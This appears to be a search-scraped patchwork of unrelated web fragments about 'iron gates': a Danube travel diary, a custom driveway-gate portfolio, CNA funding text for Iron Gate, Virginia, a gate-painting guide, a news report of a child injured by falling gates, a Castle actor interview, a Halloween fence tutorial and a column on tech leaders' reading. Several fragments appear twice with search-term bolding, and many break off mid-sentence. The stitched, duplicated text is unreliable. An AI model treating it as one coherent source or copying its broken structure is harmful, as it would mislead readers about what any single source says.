<p>That&#x2019;s all for now.</p>   <h6>This post is the property of the owner of this blog. All rights reserved. Ask first.

We hand back our keys and leave.</p>   <div>    <p>The view coming down the hill from the Lepenski Vir hotel</p>   </div>   <p>Our only possibility is to continue to Kladovo, 10 K after the enormous dam built across the Danube in 1972, a joint project between Romania and Serbia.</p>   <p>On the way, we see the narrowest part of the gorges.</p>   <div>    <p>The narrowest part of the gorges</p>   </div>   <p>We also see the Orthodox church built on the Romanian side of the Danube.</p>   <div>    <p>The church on the edge of the Danube below, on the Romanian side</p>   </div>   <p>However, the very bright sun means we can hardly make out the portrait of Decebalus sculpted into the rock face and certainly can&#x2019;t photograph it.</p>   <div>    <p>You can vaguely see the scupture of Decebalus on the left side</p>   </div>   <p>There is a hotel called Aquastar Danube that seems to have good reviews on booking.com so we give it a try. The room is spacious, with a small table and chairs as well as a large bed and is quite recent. We&#x2019;re also paying for an outdoor spa we won&#x2019;t be using. We have a panoramic view of the industrial harbour in Romania on the other bank of the river.</p>   <div>    <p>The panoramic view from the Aquastar Danube Hotel</p>   </div>   <p>We walk into the centre which is a series of caf&#xe9;s with comfortable chairs.&#xa0; We choose one and have a glass of wine. As usual there are no nibbles to go with it.</p>   <div>    <p>The main street in Kalovo with the casino on the left and cafes on the right</p>   </div>   <p>After a picnic dinner in our room, we spend the next three hours trying to decide where to go next because rain and low temperatures are forecast for most of the region for the next week. In the end we opt for in Romania, not because it&#x2019;s on the Danube, but because it&#x2019;s midway to Gyor in Hungary&#xa0; which might possibly offer cycling possibilities if the weather improves just a little bit.</p>    </div>  
   <div>   <p>We had a great time this morning at the Iron Gate Chrome &amp; Coffee meetup. it was the first time at this facility and it was very impressive. We look forward to seeing a brimstone in one of those condos one day. Thanks to all for their hospitality!</p>   <p>&#xa0;</p>  </div>

This is usually undesirable since the mention of the door provides no information as to which direction the door leads to. The solution to this is make the door scenery (so it will not be mentioned separately) and to mention the door in both of the room descriptions (so the player knows it is there.)</span>     </div>     <div>      <span>The iron gate is a door. <b>It is scenery. </b>It is east of the Sidewalk and west of the Front Porch.</span>     </div>     <div>      <span>The Sidewalk is a room. &#x201c;This is the sidewalk in front of the house you grew up in.

   <div>   <h2>Decorative Gates featuring Handmade Trees</h2>   <h4>&amp; More!</h4>   <p>Here you can see some of the <strong>custom</strong> <strong>tree themed driveway</strong> <strong>gates </strong>we&#x2019;ve built over the years. We build them all by hand, no two are quite the same. We work with individuals and/or their contractors to provide a gate that will be the perfect fit into their driveway entrance. Our gates will work with most gate openers</p>   <h2>Minnesota Oak Tree Driveway Gate</h2>   <p>This beautiful <strong>oak tree driveway gate</strong> is flanked by two massive stone columns and safeguards a log home located on an exceptional walleye fishing lake north of <strong>Minneapolis,</strong> <strong>Minnesota.</strong> We custom built the gates in <strong>Columbus, Ohio</strong> to fit the existing stone columns. All measurements were coordinated ahead of time and the communication worked out quite well because the gates fit their new resting spot perfectly. The overall height of these oak tree themed gates is about 10&#x2032; after we hung them.</p>   <h2>Texas Driveway Gates</h2>   <h3>Featuring Tree &amp; Horse Theme</h3>   <p>These feature a two-tone powder coated finish. We also added horses and a silhouette of our client&#x2019;s dog to create a plasma cut scene.</p>   <h2>Charleston, SC Driveway Gates</h2>   <p>This dual swing iron gate is mounted to steel posts and brick columns with automated electric gate openers attached. Located in front of a beautiful <strong>Charleston, SC</strong> residence.</p>   <h2>Missouri Driveway Gate featuring Horse &amp; Tree Design</h2>   <p>We designed, built and delivered this 16&#x2032; single swing gate to <strong>Missouri</strong>. The tree is plasma cut from 3/16&#x2033; steel sheet and bolted to the square tubing frame of the gate. The two horse silhouettes were also plasma cut and then welded onto the pickets of the gate. Everything was powder coated black in our new powder coat oven.</p>   <h2>Indiana Oak Tree Driveway Gates</h2>   <p>Below is a set of <strong>custom cut gates</strong> leaning against the side of my shop after the paint cured, shortly before being loaded up and hauled to Indiana where it was installed along with another set just like it. Each set was built for a 20&#x2032; opening between stone columns.</p>   <h2>Chattanooga TN Curly Tree Driveway Gates</h2>   <p>These Chattanooga, TN driveway gates were a really cool project we did for some fantastic people up on Signal Mountain at the &#x201c;Wicked Ranch&#x201d;.&#xa0; The side boxes are lit from the inside at night. The gate opener system is powered by a solar panel.</p>   <p>Another picture of the <strong>Chattanooga TN entry gate</strong>, this time in the shop.</p>   <h2>Wisconsin Oak Tree Driveway Gates</h2>   <h3>16&#x2032; dual swing</h3>   <p>Dual swing 16&#x2032; <strong>entry gate</strong> with oak tree theme built for a landscaping contractor&#x2019;s residence located in the central <strong>Wisconsin</strong> area. Approximately 8&#x2032; tall in the center.</p>   <h3>12&#x2032; dual swing design</h3>   <p>Another<strong>.</strong> Approximately 7&#x2032; tall center.</p>   <h2>Knoxville Tennessee Driveway Gates</h2>   <p>Loaded on a trailer ready to be delivered to <strong>Knoxville</strong>&#x2026;</p>   <p>These <strong>driveway gates</strong> were delivered by us to <strong>Knoxville, Tennessee</strong> in January 2016. 14&#x2019;wide, 7&#x2032; tall dual swing oak tree gate design with 1&#x2033; pickets and doubled bars on the bottom.</p>   <h2>St. Louis, Missouri Entry Gate</h2>   <p>This is a single swing variation of our <strong>oak tree entry gate</strong> built and delivered for a <strong>St. Louis, Missouri</strong> area residence.</p>   <h2>Ohio &#x201c;Tree of Life&#x201d; Driveway Gate</h2>   <p>A 24&#x2032; dual swing <strong>entrance gate</strong> for a southern <strong>Ohio</strong> farm, near Lucasville. The owner calls it the &#x201c;Tree of Life&#x201d;. It also features metal art livestock silhouettes and scenery incorporated into the background.</p>   <h2>Louisiana Entry Gates</h2>   <p>These <strong>Louisiana entry gates</strong> were built for a lady with smaller dogs. We put the pickets closer together on this one so the dogs wouldn&#x2019;t be able to get out.</p>   <h1>Interested In a Personalized Driveway Gate Design?</h1>   <p>If you have any questions at all for us we would be glad to answer them.

Grants</strong></p>   <p>Grants like scholarships in Alleghany County do not have to be repaid and are also an excellent way to finance a CNA certification. They are usually based on previous accomplishments, financial need, etc, and reflect the belief in the applicant&#x2019;s potential for future achievement.</p>   <p><strong>3. Loans</strong></p>   <p>Another way to finance a is by obtaining a student loan. Student loans usually consider the financial need of the student. Be aware that student loans must be repaid but the repayment only begins after the completion of the training. In addition, the interest rate is usually minimal on student loans.</p>   <p>Some lenders can allow deferment of the debt or the loan can be cancelled in its entirety for certain actions such as working in a low income neighborhood with a non-profit organization.</p>   <p><strong>4. Employer</strong></p>   <p>If you are already working as a nursing assistant in Virginia and looking to further your education by training to become certified, your employer may be more than happy to help you with the cost of <b>Iron</b> Gate VA . Meet with someone in the human resources department and let them know what your career goals are and find out what kind of assistance if any, your employer offers.</p>   <p><strong>Financial Aid Sources</strong></p>   <p>Sources for financial aid to be used to enroll in CNA courses include the government which is a major source of financial aid for students with programs such as the Federal Pell Grant which is based on financial need, whether you are a fulltime or part time <b>Iron</b> Gate 24448 student, etc.</p>   <p>Other sources for financial aid include many local and national businesses especially those in the healthcare industry, civic organizations, fraternal organizations, service organizations, etc. Many other professional healthcare organizations also offer assistance if contemplating an education in the healthcare field. Visit your local library or their website to get more information.</p>   <p>Many Virginia foundations also offer scholarships and grants for educational purposes.

   <div>   <p>Wrought <b>iron</b> <b>gates</b> are beautiful as they are usually painted in at least two colours, with the colours intertwining to reveal threads of gold or silver amidst another bold colour. If you just look around on a site like , you will concur.&#xa0;However, just like any other object exposed to rain and shine, wrought <b>iron</b> <b>gates</b> are not spared from the elements. Whenever your gate has faded, here is how you can paint it yourself:</p>   <p>1. Remove rust</p>   <p>Before you start painting, you&#x2019;ll need to remove any rust from the gate to ensure a smooth finishing. Use a wire brush or a scraper to remove rust from the gate.</p>   <p>2.&#xa0; Remove old paint</p>   <p>Without removing the existing paint, the new paint will not hold well onto the surface as well as cause unevenness. Use sandpaper of medium coarseness to remove all the chipped or peeling paint.</p>   <p>3. Wipe the gate</p>   <p>Use a dry rag to wipe the gate clean of any rust and paint debris. Alternatively, you may also use a soft brush as long as no dust accumulates on your gate.</p>   <p>4. Protect nearby items</p>   <p>Any paint job will be a messy one regardless how careful you are. Cover nearby objects, even plants, with cloth or newspapers. You may want to tape the newspapers in place bearing in mind that wind will displace the newspapers. If you are covering your plants, dampen them with a list mist of water before doing so.</p>   <p>5. Apply a coat of primer</p>   <p>Now that you are ready to start the painting works, first apply a coat of primer. This primer serves as an undercoat to minimize the rusting of the gate. Primers are available in two forms &#x2013; liquid and in aerosol cans. If there are intricate patterns on your gate, the aerosol would be more convenient or else you would find yourself wrestling with the paint brush in hard-to-reach areas. Make sure that you stir the primer well if you are using the liquid form, or shake the aerosol can well.</p>   <p>6. Let the primer dry</p>   <p>Primers usually take 1 to 3 hours to dry completely. This time may differ depending on the weather. The primer must dry completely before you start painting the gate for the best results.</p>   <p>7. Paint the gate</p>   <p>For wrought <b>iron</b>, use rust-inhibitive enamel paint meant for steel or metal. Using the wrong paint will cause the paint to not adhere to the surface well. Again, choose the most convenient form of paint suitable with the designs on your gate. If you are using aerosol paint, hold the can about 3-4 inches away from the gate so prevent too much paint from being sprayed and subsequently dripping and causing dried &#x2018;bumps&#x2019; of paint on your gate.</p>  </div>

   <div>   <p><i>Iron Gates</i>&#xa0;is a novel written by the Tempel ov Blood (TOB) which was published as the second release in the Martinet Press catalog after MP&#x2019;s inaugural publication, <i>The Devil&#x2019;s Quran</i>. It was with a great sense of gravity that Martinet Press assumed the mantle of the official publisher for the TOB, in light of their long-standing reputation, perhaps best indicated (as one example) by the following excerpt from R.

School officials say the entire school has been under construction for more than a year. At some point, police and witnesses say the boy must have wandered from the playground over to an area under construction where there were heavy metal <b>gates</b> leaned up against a brick enclosure. Officials say at least one of those <b>gates</b> fell onto the little boy and the construction workers had to get the boy out from underneath.</p>   <p>Emergency crews took the boy to an area where a helicopter could land and took him to Children's Mercy Hospital.</p>   <p>One witness said the boy was unresponsive at the time.</p>   <p>A neighbor told FOX 4 that a couple of weeks ago, there was orange netted fencing up around the construction site, but in this phase of construction, it was taken down.</p>   <p>&quot;Even when they had that orange netting up, the kids would crawl through, I knew someone would get hurt,&quot; one neighbor, June Floyd said.</p>   <p>&quot;I don't think it's as safe as it could be,&quot; said another neighbor, Greg Herrod.</p>   <p>According to neighbors, crews put up yellow caution tape Thursday night, but there still was not a fence to physically keep people out.</p>   <p>In a statement, the Lawrence School District says its thoughts are with the family of the young boy. &#xa0;One woman told FOX 4 he was in her child's class, a soon to be third grader. &#xa0;School starts next week- and the district has a crisis response team to help as needed. &#xa0;At the last update, the child was still in critical condition.</p>   <p>&#xa0;</p>  </div>

   <div>   <div>    Season 6 is finally giving fans a closer look at the personal life of Captain Victoria Gates (Penny Johnson Jerald). In episode 19, &#x201c;The Greater Good,&#x201d; Gates&#x2019; sister, Elizabeth Weston (Salli Richardson-Whitfield, ), enters the picture as a US Attorney involved with a murder case.    <p>Things are not particularly good between the sisters. Zap2it talked to Johnson Jerald about the episode and what it means for Gates.</p>    <p><b><i>Zap2it:</i> What can you share about &#x2018;The Greater Good&#x2019;?</b><i><b>Johnson Jerald:</b> </i>I can tell you that it is an exciting episode. I can tell you that you will enjoy the cast, the guest stars, and you&#x2019;re definitely going to support and love Salli Richardson, who is playing my sister. She&#x2019;s a wonderful choice.</p>    <p><b>Is this an episode in which Gates&#x2019; personal life is exposed, or will she mostly just be working the case?</b>This particular episode, you&#x2019;re going to get to see both. You&#x2019;re going to see her involvement in the case. But you&#x2019;re also going to see her involvement with her sister, having not seen her sister or been estranged from her sister for some time. You&#x2019;ll see that that comes to a head, and you&#x2019;ll see that it comes either to a place of resolve where either you&#x2019;ll never see that sister again, or you&#x2019;ll look forward to seeing that sister again.</p>    <p><b>How does Gates react to her sister&#x2019;s arrival?</b>I can also tell you that anytime someone comes into the precinct, and they are borrowing my detectives or going over my head or stepping on my jurisdiction, it&#x2019;s always some tension &#x2014; it doesn&#x2019;t even matter that it&#x2019;s a sister. I don&#x2019;t think Gates wants anyone coming in and taking over her house!</p>    <p><b>Why do &#x2018;Castle&#x2019; fans know so little about Gates&#x2019; personal life prior to this episode?</b>In any position like that, being the captain, you have to be the ear for those who are under you. You have to be the ear for their problems so they don&#x2019;t mix it up. You have to be careful that you don&#x2019;t bring anything from home that will affect your job at the precinct. But I can also tell you, she may have difficulty juggling that in this particular episode. Because that&#x2019;s something that&#x2019;s very real &#x2014; when that home comes directly into your workplace, you have to address it in some way, whether it&#x2019;s that you nip it and that&#x2019;s it or to explain it. One or the other or maybe both will happen on Monday night.</p>    <p><b>How has the relationship between Gates and the others changed since her arrival on the show?</b>Time has been the turning point for Gates. I think when you spend enough time around someone in a workplace, have to see that person every day, you start to see that person not just as Person Number 1 and Person Number 2, you start learning not just their names but their kids&#x2019; names. Their personal lives. You have some stories. So unless you are some evil person who couldn&#x2019;t care less about anyone, not an ounce of feeling inside, you will warm up in some way. But that doesn&#x2019;t mean you&#x2019;re going to let them fool around or not get their jobs done. But you will have a different relationship, a different rapport.</p>    <p><b>In your dreams, what would you like to see for Gates in the future?</b>I would love to see her from beginning to end work on a case with the team, with the foursome &#x2014; and have them see why she is the captain. Because you always see why Beckett is the lead detective. I think it would be most impressive to have an episode where you really get to see through their lens, through their eyes, &#x201c;Whoa, OK. I thought I knew something. But she really knows! And that&#x2019;s why she&#x2019;s the captain and I&#x2019;m not.&#x201d; And to not just see that because she&#x2019;s &#x201c;Sir&#x201d; or she&#x2019;s &#x201c;Iron Gates,&#x201d; but because you have firsthand knowledge of it with her. </p>    <p>&#x201c;The Greater Good&#x201d; episode of &#x201c;Castle&#x201d; airs Monday, March 24 at 10 p.m. on ABC.</p>   </div>  </div>

   <div>   <p>Wrought iron gates are beautiful as they are usually painted in at least two colours, with the colours intertwining to reveal threads of gold or silver amidst another bold colour. If you just look around on a site like , you will concur.&#xa0;However, just like any other object exposed to rain and shine, wrought iron gates are not spared from the elements. Whenever your gate has faded, here is how you can paint it yourself:</p>   <p>1. Remove rust</p>   <p>Before you start painting, you&#x2019;ll need to remove any rust from the gate to ensure a smooth finishing. Use a wire brush or a scraper to remove rust from the gate.</p>   <p>2.&#xa0; Remove old paint</p>   <p>Without removing the existing paint, the new paint will not hold well onto the surface as well as cause unevenness. Use sandpaper of medium coarseness to remove all the chipped or peeling paint.</p>   <p>3. Wipe the gate</p>   <p>Use a dry rag to wipe the gate clean of any rust and paint debris. Alternatively, you may also use a soft brush as long as no dust accumulates on your gate.</p>   <p>4. Protect nearby items</p>   <p>Any paint job will be a messy one regardless how careful you are. Cover nearby objects, even plants, with cloth or newspapers. You may want to tape the newspapers in place bearing in mind that wind will displace the newspapers. If you are covering your plants, dampen them with a list mist of water before doing so.</p>   <p>5. Apply a coat of primer</p>   <p>Now that you are ready to start the painting works, first apply a coat of primer. This primer serves as an undercoat to minimize the rusting of the gate. Primers are available in two forms &#x2013; liquid and in aerosol cans. If there are intricate patterns on your gate, the aerosol would be more convenient or else you would find yourself wrestling with the paint brush in hard-to-reach areas. Make sure that you stir the primer well if you are using the liquid form, or shake the aerosol can well.</p>   <p>6. Let the primer dry</p>   <p>Primers usually take 1 to 3 hours to dry completely. This time may differ depending on the weather. The primer must dry completely before you start painting the gate for the best results.</p>   <p>7. Paint the gate</p>   <p>For wrought iron, use rust-inhibitive enamel paint meant for steel or metal. Using the wrong paint will cause the paint to not adhere to the surface well. Again, choose the most convenient form of paint suitable with the designs on your gate. If you are using aerosol paint, hold the can about 3-4 inches away from the gate so prevent too much paint from being sprayed and subsequently dripping and causing dried &#x2018;bumps&#x2019; of paint on your gate.</p>  </div>

Loans</strong></p>   <p>Another way to finance a is by obtaining a student loan. Student loans usually consider the financial need of the student. Be aware that student loans must be repaid but the repayment only begins after the completion of the training. In addition, the interest rate is usually minimal on student loans.</p>   <p>Some lenders can allow deferment of the debt or the loan can be cancelled in its entirety for certain actions such as working in a low income neighborhood with a non-profit organization.</p>   <p><strong>4. Employer</strong></p>   <p>If you are already working as a nursing assistant in Virginia and looking to further your education by training to become certified, your employer may be more than happy to help you with the cost of Iron Gate VA . Meet with someone in the human resources department and let them know what your career goals are and find out what kind of assistance if any, your employer offers.</p>   <p><strong>Financial Aid Sources</strong></p>   <p>Sources for financial aid to be used to enroll in CNA courses include the government which is a major source of financial aid for students with programs such as the Federal Pell Grant which is based on financial need, whether you are a fulltime or part time Iron Gate 24448 student, etc.</p>   <p>Other sources for financial aid include many local and national businesses especially those in the healthcare industry, civic organizations, fraternal organizations, service organizations, etc. Many other professional healthcare organizations also offer assistance if contemplating an education in the healthcare field. Visit your local library or their website to get more information.</p>   <p>Many Virginia foundations also offer scholarships and grants for educational purposes. Student loans can also be obtained from many financial institutions although their interest rates may be higher than those offered by the government for student loans.</p>    <div>    <h3>Get Your Degree!</h3>    <p>Find schools and get information on the program that&#x2019;s right for you.</p>    <p>Powered by </p>   </div>   <div>    <div>     Iron Gate Info    </div>    <div>     <p>More Iron Gate VA Information:</p>    </div>   </div>  </div>

   <div>   <div>    Season 6 is finally giving fans a closer look at the personal life of Captain Victoria    <b>Gates</b> (Penny Johnson Jerald). In episode 19, &#x201c;The Greater Good,&#x201d;    <b>Gates</b>&#x2019; sister, Elizabeth Weston (Salli Richardson-Whitfield, ), enters the picture as a US Attorney involved with a murder case.    <p>Things are not particularly good between the sisters. Zap2it talked to Johnson Jerald about the episode and what it means for <b>Gates</b>.</p>    <p><b><i>Zap2it:</i> What can you share about &#x2018;The Greater Good&#x2019;?</b><i><b>Johnson Jerald:</b> </i>I can tell you that it is an exciting episode. I can tell you that you will enjoy the cast, the guest stars, and you&#x2019;re definitely going to support and love Salli Richardson, who is playing my sister. She&#x2019;s a wonderful choice.</p>    <p><b>Is this an episode in which <b>Gates</b>&#x2019; personal life is exposed, or will she mostly just be working the case?</b>This particular episode, you&#x2019;re going to get to see both. You&#x2019;re going to see her involvement in the case. But you&#x2019;re also going to see her involvement with her sister, having not seen her sister or been estranged from her sister for some time. You&#x2019;ll see that that comes to a head, and you&#x2019;ll see that it comes either to a place of resolve where either you&#x2019;ll never see that sister again, or you&#x2019;ll look forward to seeing that sister again.</p>    <p><b>How does <b>Gates</b> react to her sister&#x2019;s arrival?</b>I can also tell you that anytime someone comes into the precinct, and they are borrowing my detectives or going over my head or stepping on my jurisdiction, it&#x2019;s always some tension &#x2014; it doesn&#x2019;t even matter that it&#x2019;s a sister. I don&#x2019;t think <b>Gates</b> wants anyone coming in and taking over her house!</p>    <p><b>Why do &#x2018;Castle&#x2019; fans know so little about <b>Gates</b>&#x2019; personal life prior to this episode?</b>In any position like that, being the captain, you have to be the ear for those who are under you. You have to be the ear for their problems so they don&#x2019;t mix it up. You have to be careful that you don&#x2019;t bring anything from home that will affect your job at the precinct. But I can also tell you, she may have difficulty juggling that in this particular episode. Because that&#x2019;s something that&#x2019;s very real &#x2014; when that home comes directly into your workplace, you have to address it in some way, whether it&#x2019;s that you nip it and that&#x2019;s it or to explain it. One or the other or maybe both will happen on Monday night.</p>    <p><b>How has the relationship between <b>Gates</b> and the others changed since her arrival on the show?</b>Time has been the turning point for <b>Gates</b>. I think when you spend enough time around someone in a workplace, have to see that person every day, you start to see that person not just as Person Number 1 and Person Number 2, you start learning not just their names but their kids&#x2019; names. Their personal lives. You have some stories. So unless you are some evil person who couldn&#x2019;t care less about anyone, not an ounce of feeling inside, you will warm up in some way. But that doesn&#x2019;t mean you&#x2019;re going to let them fool around or not get their jobs done. But you will have a different relationship, a different rapport.</p>    <p><b>In your dreams, what would you like to see for <b>Gates</b> in the future?</b>I would love to see her from beginning to end work on a case with the team, with the foursome &#x2014; and have them see why she is the captain. Because you always see why Beckett is the lead detective. I think it would be most impressive to have an episode where you really get to see through their lens, through their eyes, &#x201c;Whoa, OK. I thought I knew something. But she really knows! And that&#x2019;s why she&#x2019;s the captain and I&#x2019;m not.&#x201d; And to not just see that because she&#x2019;s &#x201c;Sir&#x201d; or she&#x2019;s &#x201c;<b>Iron</b> <b>Gates</b>,&#x201d; but because you have firsthand knowledge of it with her. </p>    <p>&#x201c;The Greater Good&#x201d; episode of &#x201c;Castle&#x201d; airs Monday, March 24 at 10 p.m. on ABC.</p>   </div>  </div>

School officials say the entire school has been under construction for more than a year. At some point, police and witnesses say the boy must have wandered from the playground over to an area under construction where there were heavy metal gates leaned up against a brick enclosure. Officials say at least one of those gates fell onto the little boy and the construction workers had to get the boy out from underneath.</p>   <p>Emergency crews took the boy to an area where a helicopter could land and took him to Children's Mercy Hospital.</p>   <p>One witness said the boy was unresponsive at the time.</p>   <p>A neighbor told FOX 4 that a couple of weeks ago, there was orange netted fencing up around the construction site, but in this phase of construction, it was taken down.</p>   <p>&quot;Even when they had that orange netting up, the kids would crawl through, I knew someone would get hurt,&quot; one neighbor, June Floyd said.</p>   <p>&quot;I don't think it's as safe as it could be,&quot; said another neighbor, Greg Herrod.</p>   <p>According to neighbors, crews put up yellow caution tape Thursday night, but there still was not a fence to physically keep people out.</p>   <p>In a statement, the Lawrence School District says its thoughts are with the family of the young boy. &#xa0;One woman told FOX 4 he was in her child's class, a soon to be third grader. &#xa0;School starts next week- and the district has a crisis response team to help as needed. &#xa0;At the last update, the child was still in critical condition.</p>   <p>&#xa0;</p>  </div>

The old fence was adequate but could definitely be improved, so for 2012 it was decided that the majority of our Halloween &#x201c;budget&#x201d; would be used to create some faux wrought <b>iron</b> fence.</span></p>   <p><span>&#xa0;</span></p>   <p><span>The fence is made from 1&#xd7;2 inch pieces of lumber, &#xbd; inch PVC pipe and sheets of craft foam. Thank you to all the haunters that have posted tutorials on making cemetery fences because your instructions were a great source of inspiration and knowledge.</span></p>   <p><span>&#xa0;</span></p>   <p>&#xa0;</p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>The horizontal part of the fence was created from 8 foot sections of 1&#x201d;x2&#x201d; boards. The vertical rungs were made from &#xbd; inch PVC each four &#xa0;feet long. The design for my fence required the PVC pipe to be spaced every eight inches which meant that each eight foot section of fence would have 12 pieces of PVC. &#xa0;A 7/8<sup>th</sup>&#xa0;inch speed boar was used to drill the holes in the wood, once the first board had the holes bored it was used as a template for the other boards.&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>The PVC pipe was cut into four foot long sections using a PVC pipe cutting tool. The PVC sections were then threaded through the holes in the boards and a 1-1/8<sup>th</sup> inch drywall screw was used to secure the PVC.</span></p>   <p><span>&#xa0;</span></p>   <p><span>Now that the main structure of the fence is complete it&#x2019;s time to get creative and make the finials and ornate curved <b>iron</b> sections. Most tutorials relied on purchasing fence finials from supply companies and while this is a great idea I had neither the time nor budget for this approach. My solution was to make the decorative sections of the fence from sheets of craft foam.</span></p>   <p><span>&#xa0;</span></p>   <p><span>Craft foam can purchased from art and craft stores as well as the craft section of larger department stores. For my project I used multi-color sheets of foam but if possible I would suggest using only black foam because it will eliminate a lot of work (and grief) when it comes to painting the fence.</span></p>   <p><span>&#xa0;</span></p>   <p><span>First design the shape of your finial and cut the pattern out of a thin piece of cardboard. Use the cardboard pattern to trace the shapes onto a sheet of foam. You will need two foam pieces for each finial. A hot glue gun was used to glue the foam finials together, only glue the sides and the top leaving the bottom unglued so that it can be slid over the PVC pipe.</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>Once the hot glue has cooled the foam finials can be slipped onto the top of the PVC pipes. Additional hot glue is then used to secure the finial to the plastic pipe.</span></p>   <p><span>&#xa0;</span></p>   <p><span>The curved <b>iron</b> sections were made by gluing two sheets of foam together to increase the thickness and then cutting the foam into &#xbd;&#x201d; strips. The &#xbd;&#x201d; strips are hot glued to the wood and PVC to create an ornate design.&#xa0; Once all the foam work has been added the fence can now be painted.</span></p>   <p><span>&#xa0;</span></p>   <p><span>First the entire fence was painted black using exterior black latex paint; next I added sand to some black latex paint and generously applied it to the finials and random sections of the fence to add a rough texture that would simulate rust when the proper color is applied.</span></p>   <p><span>&#xa0;</span></p>   <p><span>After the black paint as completely dried a variety of different colors such as brown, red and orange were dry brushed over the black paint. The final step was to add some antique maple gel stain to the dry brushed areas accentuating the rust effect.</span></p>   <p><span>&#xa0;</span></p>  </div>  
   <div>   <p>The turn of the year, for whatever reason, has revealed the&#xa0;reading habits of three of the world&#x2019;s most powerful men. Though it&#x2019;s tempting to place them on a spectrum &#x2014; who among Bill Gates, Mark Zuckerberg, and Barack Obama is truly a <i>reader</i>? &#x2014; it&#x2019;s worth noting instead that two of the above three elites abstract &#x201c;reading&#x201d; into a <i>life process</i>, whereas the remaining &#x201c;reader&#x201d; cultivates an idiosyncratic, sometimes unpredictable bond with books.</p>   <p>Last year, you may remember, Zuckerberg launched an informal &#x201c;book club&#x201d; by way of his personal Facebook account. Of course, the book club wasn&#x2019;t really a club; it was more Zuckerberg blogging about stuff he&#x2019;s read as a part of his personal mission (&#x201c;A Year of Books&#x201d;) to read two books a month. (We should question whether Zuckerberg has a grasp of basic object categories: Facebook isn&#x2019;t a book; a status update isn&#x2019;t a club.) For the most part, the book club served as an ideological appendage of Zuck&#x2019;s technocratic aspirations &#x2014;&#xa0;he used it to dump neoliberal &#xa0;&#x201c;idea&#x201d; books onto suspecting readers.</p>   <p><span>Now it appears that Zuckerberg is done with his book club, although there is no word yet whether his time interfacing with print books will lead him into book publishing. Ever the good student, though, Zuck </span><span> with these conclusive remarks:</span></p>   <p><span>Reading has given me more perspective on a number of topics &#x2014; from science to religion, from poverty to prosperity, from health to energy to social justice, from political philosophy to foreign policy, and from history to futuristic fiction.</span></p>   <p>This challenge has been intellectually fulfilling, and I come away with a greater sense of hope and optimism that our society can make greater progress in all of these areas.</p>   <p>If Zuckerberg here sounds like an alien who has encountered an earthbound reading culture for the first time, no one should be surprised. Now that his &#x201c;Year in Books&#x201d; is over, his next project is to build &#x201c;a simple AI to run my home and help me with my work. You can think of it kind of like Jarvis in <em>Iron Man</em>.&#x201d;</p>   <p><span>In the future, book reviewing may be the exclusive privilege of the leisure class, or the philanthropy class, or whatever you call the group that includes Bill Gates. In an </span><span>, Gates discussed his recent turn to the book review format on his blog, </span><span>. (He&#x2019;s even added a category, Books, to a tabulated list that includes Saving Lives, Energy Innovation, Improving Education, and Philanthropy.) Why books? Well, Gates&#x2019; answer is, if anything, slightly more human and less programmatic than Zuckerberg&#x2019;s. &#x201c;I have always loved reading and learning,&#x201d; Gates said, &#x201c;so it is great if people see a book review and feel encouraged to read and share what they think online or with their friends.&#x201d;</span></p>   <p><span>The moral of this story? The urge to review books goes unsatisfied even when your every material and altruistic need is met. More interesting is Gates&#x2019; choice in books. He enjoyed, for example, Richard Dawkins&#x2019;&#xa0;</span><i><span>The Magic of Reality</span></i><span>, &#x201c;which explains various scientific ideas and is aimed at teenagers.&#x201d; Though Gates is quick to point out that he &#x201c;already understood all the concepts.&#x201d; Along these lines, Gates fell hard for Graeme Simsion&#x2019;s </span><i><span>The Rosie Project</span></i><span> and its sequel, </span><i><span>The Rosie Effect</span></i><span>, which apparently tell the story of &#x201c;a genetics professor with Asperger&#x2019;s Syndrome who goes looking for a wife.&#x201d; Gates headlined&#xa0;one of his posts about the book, &#x201c;</span><span>&#x201d; Maybe someone can remind him of </span><span>.</span></p>   <p><span>The White House released President Obama&#x2019;s vacation reading list last week, and its &#x201c;dark&#x201d; and &#x201c;heavy&#x201d; tenor </span><span> by </span><i><span>The Washington Post</span></i><span>.

I laughed when I saw it, at least until I realized that Zuckerberg </span><span>, too.</span></p>   <div>    &#xa0;&#xa0;&#xa0;&#xa0; &#xa0;&#xa0;&#xa0;&#xa0; &#xa0;&#xa0;&#xa0;&#xa0; &#xa0;&#xa0;&#xa0;&#xa0; &#xa0;&#xa0;&#xa0;&#xa0; &#xa0;&#xa0;&#xa0;&#xa0;   </div>  </div>  
   <div>   <p>The turn of the year, for whatever reason, has revealed the&#xa0;reading habits of three of the world&#x2019;s most powerful men. Though it&#x2019;s tempting to place them on a spectrum &#x2014; who among Bill <b>Gates</b>, Mark Zuckerberg, and Barack Obama is truly a <i>reader</i>? &#x2014; it&#x2019;s worth noting instead that two of the above three elites abstract &#x201c;reading&#x201d; into a <i>life process</i>, whereas the remaining &#x201c;reader&#x201d; cultivates an idiosyncratic, sometimes unpredictable bond with books.</p>   <p>Last year, you may remember, Zuckerberg launched an informal &#x201c;book club&#x201d; by way of his personal Facebook account. Of course, the book club wasn&#x2019;t really a club; it was more Zuckerberg blogging about stuff he&#x2019;s read as a part of his personal mission (&#x201c;A Year of Books&#x201d;) to read two books a month. (We should question whether Zuckerberg has a grasp of basic object categories: Facebook isn&#x2019;t a book; a status update isn&#x2019;t a club.) For the most part, the book club served as an ideological appendage of Zuck&#x2019;s technocratic aspirations &#x2014;&#xa0;he used it to dump neoliberal &#xa0;&#x201c;idea&#x201d; books onto suspecting readers.</p>   <p><span>Now it appears that Zuckerberg is done with his book club, although there is no word yet whether his time interfacing with print books will lead him into book publishing. Ever the good student, though, Zuck </span><span> with these conclusive remarks:</span></p>   <p><span>Reading has given me more perspective on a number of topics &#x2014; from science to religion, from poverty to prosperity, from health to energy to social justice, from political philosophy to foreign policy, and from history to futuristic fiction.</span></p>   <p>This challenge has been intellectually fulfilling, and I come away with a greater sense of hope and optimism that our society can make greater progress in all of these areas.</p>   <p>If Zuckerberg here sounds like an alien who has encountered an earthbound reading culture for the first time, no one should be surprised. Now that his &#x201c;Year in Books&#x201d; is over, his next project is to build &#x201c;a simple AI to run my home and help me with my work. You can think of it kind of like Jarvis in <em><b>Iron</b> Man</em>.&#x201d;</p>   <p><span>In the future, book reviewing may be the exclusive privilege of the leisure class, or the philanthropy class, or whatever you call the group that includes Bill <b>Gates</b>. In an </span><span>, <b>Gates</b> discussed his recent turn to the book review format on his blog, </span><span>. 